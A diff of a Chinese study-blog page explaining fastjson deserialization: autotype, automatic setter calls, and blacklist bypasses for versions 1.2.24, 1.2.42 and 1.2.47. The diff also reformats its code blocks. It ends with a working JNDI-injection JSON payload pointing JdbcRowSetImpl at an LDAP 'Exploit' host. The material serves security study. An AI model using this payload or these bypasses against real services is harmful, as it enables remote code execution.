@@ -467,11 +467,55 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>exp利用不必多说，主要是学习下原理。以下都在jdk1.8调试。</p>
 <p>可以按wh1t3p1g师傅的博文学习。<br><a href="https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/" target="_blank" rel="noopener">https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/</a></p>
 <p>三个demo类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Phone phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name+<span class="string">":"</span>+phone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">public class Person {
 
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String phoneNumber;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(String phoneNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    public String name;
 
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String location;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">(String phoneNumber, String location)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">        <span class="keyword">this</span>.location = location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber+<span class="string">":"</span>+<span class="keyword">this</span>.location;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    public Phone phone;
+
+    public Person() {
+    }
+
+    public Person(String name, Phone phone) {
+        this.name = name;
+        this.phone = phone;
+    }
+
+    @Override
+    public String toString(){
+        return name+&quot;:&quot;+phone;
+    }
+}</code></pre>
+<pre><code class="java">public class Phone {
+
+    public String phoneNumber;
+
+    public Phone() {
+    }
+
+    public Phone(String phoneNumber) {
+        this.phoneNumber = phoneNumber;
+    }
+
+    public String toString(){
+        return this.phoneNumber;
+    }
+}</code></pre>
+<pre><code class="java">public class NewPhone extends Phone {
+    public String location;
+
+    public NewPhone(){
+    }
+
+    public NewPhone(String phoneNumber, String location) {
+        this.phoneNumber = phoneNumber;
+        this.location = location;
+    }
+
+    public String toString(){
+        return this.phoneNumber+&quot;:&quot;+this.location;
+    }
+}</code></pre>
 <p>fastjson库一般我们重点关注几个基本功能方法</p>
 <ul>
 <li><code>JSON.toJSONString()</code></li>
@@ -479,13 +523,37 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li><code>JSON.parseObject()</code></li>
 </ul>
 <p>Test</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">"byc_404"</span>,<span class="keyword">new</span> Phone(<span class="string">"123123123"</span>));</span><br><span class="line">        <span class="comment">//Person person = new Person("byc_404",new NewPhone("123123123","china"));</span></span><br><span class="line">        String json = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ouput:</span></span><br><span class="line"><span class="comment">//1.</span></span><br><span class="line"><span class="comment">//&#123;"name":"byc_404","phone":&#123;"phoneNumber":"123123123"&#125;&#125;</span></span><br><span class="line"><span class="comment">//byc_404:123123123</span></span><br><span class="line"><span class="comment">//2.</span></span><br><span class="line"><span class="comment">//&#123;"name":"byc_404","phone":&#123;"location":"china","phoneNumber":"123123123"&#125;&#125;</span></span><br><span class="line"><span class="comment">//byc_404:123123123</span></span><br></pre></td></tr></table></figure>
+<pre><code class="java">import com.alibaba.fastjson.JSON;
+
+public class Test {
+
+    public static void main(String[] args) {
+        Person person = new Person(&quot;byc_404&quot;,new Phone(&quot;123123123&quot;));
+        //Person person = new Person(&quot;byc_404&quot;,new NewPhone(&quot;123123123&quot;,&quot;china&quot;));
+        String json = JSON.toJSONString(person);
+        System.out.println(json);
+        Person p = JSON.parseObject(json, Person.class);
+        System.out.println(p);
+    }
+}
+
+//ouput:
+//1.
+//{&quot;name&quot;:&quot;byc_404&quot;,&quot;phone&quot;:{&quot;phoneNumber&quot;:&quot;123123123&quot;}}
+//byc_404:123123123
+//2.
+//{&quot;name&quot;:&quot;byc_404&quot;,&quot;phone&quot;:{&quot;location&quot;:&quot;china&quot;,&quot;phoneNumber&quot;:&quot;123123123&quot;}}
+//byc_404:123123123</code></pre>
 <p>这里最显著的问题就是。我们两次执行代码时在<code>parseObject</code>后输出的结果是一致的。这显然不符合我们的预期,因为这直接丢失了newphone类的location属性。</p>
 <blockquote>
 <p>由于fastjson不知道需要还原的Person的Phone是本身还是子类NewPhone，面对这种多态方式，fastjson还原的是父类，而不是子类NewPhone</p>
 </blockquote>
 <p>在这种情况下就产生了autotype.我们将上面<code>TOJSONString</code>这行代码更改下</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&#123;"@type":"Person","name":"john","phone":&#123;"@type":"NewPhone","location":"china","phoneNumber":"123123123"&#125;&#125;</span></span><br><span class="line"><span class="comment">//john:123123123:china</span></span><br></pre></td></tr></table></figure>
+<pre><code class="java">String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);
+
+//output
+//{&quot;@type&quot;:&quot;Person&quot;,&quot;name&quot;:&quot;john&quot;,&quot;phone&quot;:{&quot;@type&quot;:&quot;NewPhone&quot;,&quot;location&quot;:&quot;china&quot;,&quot;phoneNumber&quot;:&quot;123123123&quot;}}
+//john:123123123:china</code></pre>
 <p>这里我们可以看到<code>@type</code>帮助我们避免了子类丢失字段的问题,成功还原了对象。但是我们自然可以想到,如果将其指定为恶意类,就可能导致恶意代码执行了。这就是最早的fastjson版本的rce漏洞。</p>
 <p>然后因为本地jdk1.8版本太高就不复现了……打法自然是rmi / ldap两种方法。</p>
 <p>这里提一下fastjson之所以能执行一系列方法的起因:fastjson 自动调用getter和setter以及无参数的构造函数</p>
@@ -509,33 +577,100 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>经过上述的两个条件提取后，保留了符合条件的getter和setter，并于com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue函数中invoke调用，也就是说实现了类似反序列化过程中主动调用readObject函数的效果。</p>
 </blockquote>
 <p>由条件，此时可以利用传入某字段的方式来主动调用相关符合条件的setter和getter。例如在Person里面添加一个setTest函数，并在需要转化的json中添加”test”:1，这将会主动调用setTest。<br>如下</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(String test)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.test = test;</span><br><span class="line">    System.out.println(<span class="string">"setTest Method called!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String json=<span class="string">"&#123;\"name\":\"byc_404\",\"phone\":&#123;\"phoneNumber\":\"123123123\"&#125;,\"test\":\"1\"&#125;"</span>;</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="comment">//setTest Method called!</span></span><br><span class="line"><span class="comment">//byc_404:123123123</span></span><br></pre></td></tr></table></figure>
+<pre><code class="java">public void setTest(String test) {
+    this.test = test;
+    System.out.println(&quot;setTest Method called!&quot;);
+}</code></pre>
+<pre><code class="java">String json=&quot;{\&quot;name\&quot;:\&quot;byc_404\&quot;,\&quot;phone\&quot;:{\&quot;phoneNumber\&quot;:\&quot;123123123\&quot;},\&quot;test\&quot;:\&quot;1\&quot;}&quot;;
+Person p = JSON.parseObject(json, Person.class);
+System.out.println(p);
+
+//output:
+//setTest Method called!
+//byc_404:123123123</code></pre>
 <p><strong>我们在利用@type构造有危害的利用链时，主要就是查找有危害的无参数的构造函数、符合条件的getter和setter。</strong></p>
 <h2 id="1-2-24-修复-bypass"><a href="#1-2-24-修复-bypass" class="headerlink" title="1.2.24 修复 bypass"></a>1.2.24 修复 bypass</h2><p>然后改下maven里fastjson依赖看看高一个版本的fastjson防护。发现多了一个checkAutoType方法。当然这个版本同时需要手动开启autoType.</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    String deny;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">if (this.autoTypeSupport || expectClass != null) {
+    int i;
+    String deny;
+    for(i = 0; i &lt; this.acceptList.length; ++i) {
+        deny = this.acceptList[i];
+        if (className.startsWith(deny)) {
+            return TypeUtils.loadClass(typeName, this.defaultClassLoader);
+        }
+    }
+
+    for(i = 0; i &lt; this.denyList.length; ++i) {
+        deny = this.denyList[i];
+        if (className.startsWith(deny)) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+    }
+}</code></pre>
 <p>这里做了一次白名单一次黑名单的检查。优先载入手工配置的白名单类，并对黑名单类爆出异常。<br>然后后面继续调用时,如果不符合前面的情况，后面就会进入这一段</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">    accept = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">for(i = 0; i &lt; this.acceptList.length; ++i) {
+    accept = this.acceptList[i];
+    if (className.startsWith(accept)) {
+        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
+        if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+        }
+
+        return clazz;
+    }
+}</code></pre>
 <p>跟进<code>loadClass</code>.</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure>
+<pre><code class="java">if (clazz != null) {
+        return clazz;
+    } else if (className.charAt(0) == &#39;[&#39;) {
+        Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+        return Array.newInstance(componentType, 0).getClass();
+    } else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) {
+        String newClassName = className.substring(1, className.length() - 1);
+        return loadClass(newClassName, classLoader);
+    } else {
+                ......</code></pre>
 <p>在黑名单检测之后，当开头有<code>[</code>或者开头有<code>L</code>和结尾有<code>;</code>时会去掉这些字符，从而造成了黑名单的绕过。因为它是用startswith检测黑名单的。</p>
 <h2 id="1-2-42-bypass"><a href="#1-2-42-bypass" class="headerlink" title="1.2.42 bypass"></a>1.2.42 bypass</h2><p>然后上面那个bypass的修复主要是</p>
 <p><img src="/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/0.PNG" class="lazyload" data-srcset="%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>把黑名单全部换成hash防止深入是这个版本的特点,同时上面这个代码的作用是如果满足某个条件的话就去掉那些<code>Lxxx;</code>的前后第一个字符。<br>然而修复治标不治本，说实话有点蠢,这里只需要<code>LLxxx;;</code>就能绕了。<br>而且黑名单hash也有dalao 测过的。之前看LandGrey佬收藏过，<br><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
 <h2 id="1-2-47-bypass"><a href="#1-2-47-bypass" class="headerlink" title="1.2.47 bypass"></a>1.2.47 bypass</h2><p>1.2.48以前的checkAutoTyye有这样一段代码。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> (Class)mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {
+    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+}
+
+......
+
+public static Class&lt;?&gt; getClassFromMapping(String className) {
+    return (Class)mappings.get(className);
+}</code></pre>
 <p>这里很奇怪的if的条件导致：即使前面搜到了黑名单里的类，如果mappings里面存在这个类,那么仍可以进行下一步操作。<br>这里的mappings是fastjson提早载入的一些缓存类</p>
 <p>那么假如可以将恶意类加入mappings就能有绕过的效果了。</p>
 <p>这里我们继续跟进</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; clazz != HashMap<span class="class">.<span class="keyword">class</span> &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">if (clazz == null) {
+    clazz = TypeUtils.getClassFromMapping(typeName);
+}
+
+if (clazz == null) {
+    clazz = this.deserializers.findClass(typeName);
+}
+
+if (clazz != null) {
+    if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
+        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+    } else {
+        return clazz;
+    }</code></pre>
 <p>针对deserializers.findClass,这里类中有一个初始方法，在deserializers里面预先填充了一些类与其反序列化器的实例。</p>
 <p><img src="/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>其中包括一个</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.deserializers.put(Class<span class="class">.<span class="keyword">class</span>, <span class="title">MiscCodec</span>.<span class="title">instance</span>)</span>;</span><br></pre></td></tr></table></figure>
+<pre><code class="java"> this.deserializers.put(Class.class, MiscCodec.instance);</code></pre>
 <p>重点在经过autotype检查后MiscCodec这个反序列化器是怎么处理Class.class的。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">if (clazz == Class.class) {
+    return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
+} </code></pre>
 <p>而<code>TypeUtils.loadClass</code>非常好用.他将使用ClassLoader.loadClass或Class.forName来载入类，在这一过程中，涉及到了mappings的操作,即调用了<code>mappings.put(className,clazz)</code>.那么这样的话会直接将载入后的对象填入mappings。</p>
 <p>那么只要提前将恶意类载入mappings就好了。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json = <span class="string">"&#123;&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://localhost:1389/Exploit\",\"autoCommit\": true&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">json = &quot;{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://localhost:1389/Exploit\",\"autoCommit\": true}}&quot;;</code></pre>
 
   
   
@@ -746,7 +881,7 @@ signi...</p>
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -758,9 +893,9 @@ signi...</p>
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -893,6 +1028,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1106,7 +1243,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1162,6 +1299,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
